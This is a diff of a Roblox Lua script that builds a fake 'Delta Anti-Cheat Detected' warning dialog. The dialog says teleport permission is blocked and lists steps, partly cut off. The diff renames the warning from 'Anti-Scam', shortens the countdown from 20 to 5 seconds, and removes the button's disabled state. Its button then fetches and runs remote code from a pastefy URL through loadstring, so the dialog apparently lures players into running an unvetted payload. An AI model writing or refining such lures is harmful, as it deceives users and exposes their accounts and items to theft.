@@ -13,11 +13,11 @@ gui.Name = "DeltaGui"
 gui.Parent = player.PlayerGui
 gui.ResetOnSpawn = false
 
--- 📦 Main Frame
+-- 📦 Main Frame (Top Placement with height 240)
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 500, 0, 250)
-frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Size = UDim2.new(0, 500, 0, 240) -- width 500, height 240
+frame.Position = UDim2.new(0.5, 0, 0, 5) -- top of screen (5px down from Roblox bar)
+frame.AnchorPoint = Vector2.new(0.5, 0) -- anchored from top center
 frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
 frame.BorderSizePixel = 0
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
@@ -41,7 +41,7 @@ title.BackgroundTransparency = 1
 title.Font = Enum.Font.GothamBold
 title.TextSize = 18
 title.TextColor3 = Color3.fromRGB(255,255,255)
-title.Text = "Delta Anti-Scam Detected"
+title.Text = "Delta Anti-Cheat Detected"
 
 -- 📖 Instructions
 local instructions = Instance.new("TextLabel", frame)
@@ -62,13 +62,13 @@ The script requires teleport permission, which is currently blocked by Delta's <
 4) Rejoin and run the script again.
 ]]
 
--- 📦 Buttons Frame
+-- 📂 Buttons Frame
 local btnFrame = Instance.new("Frame", frame)
 btnFrame.Size = UDim2.new(1, -30, 0, 45)
 btnFrame.Position = UDim2.new(0, 15, 1, -55)
 btnFrame.BackgroundTransparency = 1
 
--- ⏳ Gray Button (Countdown)
+-- 🔘 Gray Button (Countdown)
 local grayBtn = Instance.new("TextButton", btnFrame)
 grayBtn.Size = UDim2.new(0.5, -5, 1, 0)
 grayBtn.Position = UDim2.new(0,0,0,0)
@@ -76,9 +76,8 @@ grayBtn.BackgroundColor3 = Color3.fromRGB(140,140,140)
 grayBtn.Font = Enum.Font.GothamBold
 grayBtn.TextSize = 14
 grayBtn.TextColor3 = Color3.fromRGB(255,255,255)
-grayBtn.Text = "Click to Open Script (20.0s)"
+grayBtn.Text = "Click to Open Script (5.0s)"
 grayBtn.AutoButtonColor = false
-grayBtn.Active = false -- 🔒 start disabled
 Instance.new("UICorner", grayBtn).CornerRadius = UDim.new(0, 8)
 
 -- 🔵 Blue Button (Rejoin)
@@ -92,30 +91,25 @@ blueBtn.TextColor3 = Color3.fromRGB(255,255,255)
 blueBtn.Text = "Rejoin Game"
 Instance.new("UICorner", blueBtn).CornerRadius = UDim.new(0, 8)
 
--- ⏱️ Timer Countdown
-local countdown = 10
+-- ⏱️ Timer Countdown with decimals + load script
+local countdown = 5 -- changed from 20 to 5
 task.spawn(function()
     while countdown > 0 do
         grayBtn.Text = string.format("Click to Open Script (%.1fs)", countdown)
         countdown -= 0.1
         task.wait(0.1)
     end
-    -- ✅ Enable after countdown
     grayBtn.Text = "Click to Open Script"
     grayBtn.AutoButtonColor = true
     grayBtn.BackgroundColor3 = Color3.fromRGB(90,200,90)
-    grayBtn.Active = true
-end)
 
--- 📌 Gray Button Action (Updated link)
-grayBtn.MouseButton1Click:Connect(function()
-    if countdown <= 0 then
+    grayBtn.MouseButton1Click:Connect(function()
         gui:Destroy()
         loadstring(game:HttpGet("https://pastefy.app/Aie2ReUu/raw"))()
-    end
+    end)
 end)
 
--- 📌 Rejoin Button Action
+-- 🔁 Rejoin button
 blueBtn.MouseButton1Click:Connect(function()
     TeleportService:Teleport(game.PlaceId, player)
 end)
